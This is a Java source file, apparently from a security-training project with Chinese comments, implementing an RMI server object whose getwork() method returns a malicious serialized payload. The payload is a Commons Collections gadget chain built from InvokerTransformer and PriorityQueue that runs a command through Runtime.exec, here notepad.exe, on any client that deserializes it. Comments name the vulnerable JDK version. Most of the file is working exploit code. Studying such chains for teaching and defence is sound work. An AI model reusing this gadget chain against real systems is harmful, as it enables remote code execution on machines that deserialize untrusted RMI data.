package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import com.madaha.codesecone.controller.AdvancedAttack.deserialize.CommonCollections.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.PriorityQueue;


/**
 * 注意：
 *    （1）高版本的 jdk 会修复一些漏洞，所在进行CC1链分析前，需要对IDEA进行调试即安装未修复漏洞前的JDK版本。
 *    （2）对于CC1链，JDK版本应该为8u71之前,这里用8u65即可。
 */


// 在 java.rmi.server.UnicastRemoteObject 的构造函数中将生 stub（存根） 和 skeleton（骨架）。
public class UserImpl extends UnicastRemoteObject implements User{
    // 必须有一个显示的构造函数（否则报错），并且要抛出一个RemoteException异常
    public UserImpl() throws RemoteException{
        super();
    }

    @Override
    public String name(String name) throws RemoteException {
        return name;
    }

    @Override
    public void say(String say) throws RemoteException {
        System.out.println("you speak" + say);
    }

    @Override
    public void dowork(Object work) throws RemoteException {
        System.out.println("you work is" + work);
    }

    @Override
    public Object getwork() throws Exception {
        // 1、返回一个恶意的对象，RMI通信时会自动将对象进行序列化；
        // 2、客户端、服务端和注册中心，都必须要反序列化对象的class文件，否则无法进行序列化和反序列化；
        // 3、反序列化具有传递性，即 对象内包含的其他对象都会被序列化；

        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"notepad.exe"}),
                new ConstantTransformer(1),
        };

        Transformer faketransformerchain =  new ChainedTransformer(fakeTransformers);
        TransformingComparator comparator = new TransformingComparator(faketransformerchain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(faketransformerchain, "iTransformers", transformers);

        return queue;
    }
}
